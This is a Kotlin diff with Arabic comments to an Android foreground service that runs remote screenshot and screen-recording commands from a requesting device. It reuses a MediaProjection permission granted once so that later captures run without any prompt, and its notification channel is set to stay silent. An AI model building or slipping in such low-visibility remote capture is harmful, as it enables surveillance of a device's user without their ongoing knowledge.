@@ -177,6 +177,16 @@ class HostForegroundService : LifecycleService() {
     )
 
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
+
+    /**
+     * أمر التقاط معلّق ينتظر المنح الأوّل لإذن MediaProjection:
+     * "screen_shot" أو "screen_record". بعد نجاح المنح (من نشاط الإذن الشفاف)
+     * يُنفَّذ فوراً ويُرسل ردّه للجهاز الطالب — ولا تُطلب الموافقة مجدداً بعدها؛
+     * يعاد استخدام النية المخزّنة `screenCaptureIntent` مباشرة في مرة لقطة/تسجيل قادمة.
+     */
+    private var pendingScreenAction: String? = null
+    private var pendingScreenDuration: Int = 15
+    private var pendingScreenRequestId: Int = -1
     private val json = Json { ignoreUnknownKeys = true }
     private val requestIdCounter = AtomicInteger(0)
 
@@ -1182,35 +1192,64 @@ class HostForegroundService : LifecycleService() {
             }
 
             Commands.SCREEN_SHOT -> {
-                val ok = runScreenShot()
-                buildJsonObject {
-                    put("cmd", Commands.SCREEN_SHOT)
-                    if (ok != null) {
-                        put("captured", true)
-                        put("name", ok.first)
-                        put("path", ok.second)
-                        put("size", ok.third)
-                    } else {
+                if (screenCaptureIntent == null) {
+                    // لم يُمنح الإذن بعد: نجدول الالتقاط المعلّق ونطلب الإذن مرة واحدة
+                    // فقط؛ بعد المنح يُنفَّذ الالتقاط تلقائياً ويردّ نتيجته على المُرسل.
+                    pendingScreenAction = "screen_shot"
+                    pendingScreenDuration = 0
+                    pendingScreenRequestId = request.id
+                    launchScreenPermissionRequest()
+                    buildJsonObject {
+                        put("cmd", Commands.SCREEN_SHOT)
                         put("captured", false)
-                        put("error", "يلزم تفعيل البث عبر الإذن المعتمد: افتح بث الشاشة مرة واحدة لإذن التقاط وسائل العرض ثم أعد المحاولة")
+                        put("pendingPermission", true)
+                        put("message", "يلزم منح إذن التقاط الشاشة مرة واحدة فقط على المضيف؛ بعد المنح تعمل اللقطات والتسجيلات دون أي إذن أو نافذة إضافية.")
+                    }
+                } else {
+                    val ok = runScreenShot()
+                    buildJsonObject {
+                        put("cmd", Commands.SCREEN_SHOT)
+                        if (ok != null) {
+                            put("captured", true)
+                            put("name", ok.first)
+                            put("path", ok.second)
+                            put("size", ok.third)
+                        } else {
+                            put("captured", false)
+                            put("error", "فشل الالتقاط رغم توفر الإذن — أعد المحاولة")
+                        }
                     }
                 }
             }
 
             Commands.SCREEN_RECORD -> {
                 val duration = request.params?.get("duration")?.jsonPrimitive?.contentOrNull?.toIntOrNull() ?: 15
-                val ok = runScreenRecord(duration)
-                buildJsonObject {
-                    put("cmd", Commands.SCREEN_RECORD)
-                    if (ok != null) {
-                        put("captured", true)
-                        put("name", ok.first)
-                        put("path", ok.second)
-                        put("size", ok.third)
-                        put("durationMs", duration.coerceIn(1, 600) * 1000)
-                    } else {
+                if (screenCaptureIntent == null) {
+                    pendingScreenAction = "screen_record"
+                    pendingScreenDuration = duration.coerceIn(1, 600)
+                    pendingScreenRequestId = request.id
+                    launchScreenPermissionRequest()
+                    buildJsonObject {
+                        put("cmd", Commands.SCREEN_RECORD)
                         put("captured", false)
-                        put("error", "يلزم تفعيل البث عبر الإذن المعتمد: افتح بث الشاشة مرة واحدة لإذن التقاط وسائل العرض ثم أعد المحاولة")
+                        put("pendingPermission", true)
+                        put("duration", duration)
+                        put("message", "يلزم منح إذن التقاط الشاشة مرة واحدة فقط على المضيف؛ بعد المنح يبدأ التسجيل تلقائياً دون أي إذن أو نافذة إضافية.")
+                    }
+                } else {
+                    val ok = runScreenRecord(duration)
+                    buildJsonObject {
+                        put("cmd", Commands.SCREEN_RECORD)
+                        if (ok != null) {
+                            put("captured", true)
+                            put("name", ok.first)
+                            put("path", ok.second)
+                            put("size", ok.third)
+                            put("durationMs", duration.coerceIn(1, 600) * 1000)
+                        } else {
+                            put("captured", false)
+                            put("error", "فشل التسجيل رغم توفر الإذن — أعد المحاولة")
+                        }
                     }
                 }
             }
@@ -1291,10 +1330,21 @@ class HostForegroundService : LifecycleService() {
     }
 
     /**
-     * يبدأ بث الشاشة باستخدام إذن MediaProjection المستلم من النشاط الشفاف.
+     * يستلم إذن MediaProjection من نشاط الإذن الشفاف ويخزّنه لكل الالتقاطات اللاحقة.
+     * إذا وُجد أمر التقاط معلّق (لقطة/تسجيل) انتظر المنح، يُنفَّذ فوراً بلا بدء
+     * بث WebRTC وبلا أي نوافذ إضافية، ويُرسل ردّه للجهاز الطالب بالـ requestId الأصلي.
      */
     fun startScreenStreamWithIntent(intent: Intent) {
         screenCaptureIntent = intent
+        val action = pendingScreenAction
+        val requestId = pendingScreenRequestId
+        val duration = pendingScreenDuration
+        pendingScreenAction = null
+        pendingScreenRequestId = -1
+        if (action != null) {
+            runPendingScreenAction(action, requestId, duration)
+            return
+        }
         val ok = peerManager?.startScreenStreaming(intent) ?: false
         if (ok) {
             cameraStreamingState.value = CameraStreamingState(
@@ -1302,6 +1352,63 @@ class HostForegroundService : LifecycleService() {
                 isFrontCamera = false,
                 isAudioEnabled = true
             )
+        }
+    }
+
+    /**
+     * تنفيذ أمر الالتقاط المعلّق بعد منح الإذن الأوّل (مرة واحدة فقط لكل منح):
+     * اللقطة/التسجيل يعملان عبر `getMediaProjection(RESULT_OK, intent)` بالنية
+     * المخزّنة — دون أي حوار إذن جديد (الإذن صالح حتى إيقاف الخدمة أو سحبه نظاماً).
+     */
+    private fun runPendingScreenAction(action: String, requestId: Int, durationSeconds: Int) {
+        scope.launch {
+            val result = if (action == "screen_shot") runScreenShot() else runScreenRecord(durationSeconds)
+            val data = buildJsonObject {
+                put("cmd", action)
+                if (result != null) {
+                    put("captured", true)
+                    put("name", result.first)
+                    put("path", result.second)
+                    put("size", result.third)
+                    if (action == "screen_record") {
+                        put("durationMs", durationSeconds.coerceIn(1, 600) * 1000)
+                    }
+                } else {
+                    put("captured", false)
+                    put("error", "فشل الالتقاط بعد منح الإذن — أعد المحاولة")
+                }
+            }
+            try {
+                peerManager?.sendResponse(
+                    BridgeResponse(
+                        requestId,
+                        result != null,
+                        if (result == null) "فشل الالتقاط بعد منح الإذن" else null,
+                        data
+                    )
+                )
+            } catch (t: Throwable) {
+                Log.w(TAG, "تعذر إرسال ردّ الالتقاط المعلّق: ${t.message}")
+            }
+        }
+    }
+
+    /**
+     * فتح نافذة طلب إذن الالتقاط عند الحاجة الأوّل حصراً:
+     * مؤشرات النظام في زاوية الشاشة (مؤشر مشاركة الشاشة/نقطة الكاميرا/الميكروفون)
+     * تدل المستخدم على النشاط وهي إلزامية من أندرويد؛ ولا تُنشئ هذه الدالة أي
+     * إشعار إضافي — إشعار الخدمة الأمامية قناة بلا أهمية (IMPORTANCE_NONE) فلا
+     * يُنير شاشة مقفلة ولا يصدر صوتاً أو اهتزازاً.
+     */
+    private fun launchScreenPermissionRequest() {
+        try {
+            val permIntent = Intent(applicationContext, ScreenCapturePermissionActivity::class.java).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            startActivity(permIntent)
+        } catch (t: Throwable) {
+            Log.w(TAG, "تعذر فتح نافذة إذن الالتقاط: ${t.message}")
+            pendingScreenAction = null
         }
     }
 
